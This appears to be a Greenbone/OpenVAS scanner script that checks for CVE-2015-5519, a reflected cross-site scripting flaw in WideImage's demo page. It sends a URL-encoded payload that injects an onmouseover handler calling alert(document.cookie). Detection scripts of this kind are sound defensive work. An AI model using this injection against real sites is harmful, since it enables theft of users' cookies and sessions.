CPE = "cpe:/a:wideimage:wideimage";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805683" );
	script_version( "2020-10-20T15:03:35+0000" );
	script_cve_id( "CVE-2015-5519" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)" );
	script_tag( name: "creation_date", value: "2015-08-03 12:38:23 +0530 (Mon, 03 Aug 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "WideImage Demo Code Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WideImage
  and is prone to cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaw exists as the application does not
  validate input passed via 'matrix parameter' to demo/index.php script before
  returning it to user." );
	script_tag( name: "impact", value: "Successful exploitation will allow a
  context-dependent attacker to create a specially crafted request that would
  execute arbitrary script code in a user's browser session within the trust
  relationship between their browser and the server." );
	script_tag( name: "affected", value: "WideImage version 11.02.19" );
	script_tag( name: "solution", value: "Remove the 'test' and 'demo' directories
  after installation." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_xref( name: "URL", value: "http://www.scip.ch/en/?vuldb.76509" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2015/Jul/30" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/132584" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_wideimage_detect.sc" );
	script_mandatory_keys( "WideImage/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/demo/?colors=255&demo=applyConvolution&dither=1&dither_cb=1&div=1&" + "match_palette=1&match_palette_cb=1&matrix=2%25200%25200%252c%2" + "5200%2520-1%25200%252c%25200%25200%2520-1%22%20onmouseover%3d" + "alert%28document.cookie%29%20bad%3d%22&offset=220&output=preset" + "%20for%20demo";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "alert\\(document.cookie\\)", extra_check: ">WideImage" )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}

